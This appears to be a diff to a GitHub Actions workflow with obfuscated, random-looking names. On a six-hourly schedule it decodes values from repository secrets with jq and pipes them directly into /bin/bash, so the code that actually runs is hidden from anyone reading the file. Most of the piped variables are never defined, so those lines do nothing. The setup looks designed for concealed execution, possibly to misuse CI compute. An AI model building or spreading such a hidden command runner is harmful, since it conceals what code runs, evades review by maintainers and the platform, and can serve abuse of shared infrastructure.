@@ -2,18 +2,25 @@ name: protectivebiking
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 2/6 * * *'
+    - cron: '41 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: protectivebiking
         env:
-          c271: ${{ secrets.c271 }}
+          cxr40: ${{ secrets.cxr40 }}
         run: |
-          echo $c271 | jq -r .j74929 | /bin/bash
-          echo $hl41084 | jq -r .qwkkn62632 | /bin/bash
-          echo $lpnli0636 | jq -r .rqx8 | /bin/bash
-          echo $ognak0200 | jq -r .icu35403 | /bin/bash
+          echo $cxr40 | jq -r .flngo0429 | /bin/bash
+          echo $gcx4885 | jq -r .m15575 | /bin/bash
+          echo $o28874 | jq -r .uih634 | /bin/bash
+          echo $czpyl1055 | jq -r .mhpwn258 | /bin/bash
+          echo $gjf1 | jq -r .qgzm6 | /bin/bash
+          echo $fa92221 | jq -r .o41 | /bin/bash
+          echo $erbwq5 | jq -r .lkz78 | /bin/bash
+          echo $i53 | jq -r .er60247 | /bin/bash
+          echo $crt5 | jq -r .d858 | /bin/bash
 
